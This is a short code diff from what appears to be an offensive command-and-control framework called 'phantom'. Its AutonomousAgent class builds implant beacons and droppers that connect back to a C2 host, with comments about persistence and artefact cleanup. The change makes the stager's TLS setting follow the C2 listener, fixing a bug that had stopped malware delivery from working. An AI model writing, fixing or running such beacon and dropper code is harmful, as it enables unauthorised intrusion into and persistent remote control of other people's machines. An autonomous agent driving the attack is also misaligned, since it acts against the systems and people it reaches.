@@ -1763,10 +1763,11 @@ class AutonomousAgent:
             # comparison of the whole generated header: that always differed
             # (the builder adds ladder/proxy/pin) so every build was forced.
             force = (beacon_config_endpoint(beacon_dir) != (c2_host, c2_port))
+            from phantom.utils.network import c2_use_ssl
             return compile_beacon(
                 platform, os.path.dirname(phantom.__file__),
                 force_rebuild=force, arch="x64",
-                host=c2_host, port=c2_port, use_ssl=True)
+                host=c2_host, port=c2_port, use_ssl=c2_use_ssl())
         except Exception:
             return None
 
@@ -1805,8 +1806,12 @@ class AutonomousAgent:
         # retry artefact is persistence, so `--no-resilient` is the explicit
         # opt-out and the artefact names are deterministic for cleanup.
         resilient = getattr(self, "resilient_stager", True)
-        dropper = generate_dropper(platform, c2_host, c2_port, use_ssl=True,
-                                   resilient=resilient)
+        # TLS follows the LISTENER: a literal `True` here built every
+        # autonomous stager for https even when the C2 was up on plain HTTP,
+        # so the delivery silently could not work.
+        from phantom.utils.network import c2_use_ssl
+        dropper = generate_dropper(platform, c2_host, c2_port,
+                                   use_ssl=c2_use_ssl(), resilient=resilient)
         if not dropper:
             raise ValueError(f"no dropper defined for platform {platform}")
         self._emit("note", capability="stager",
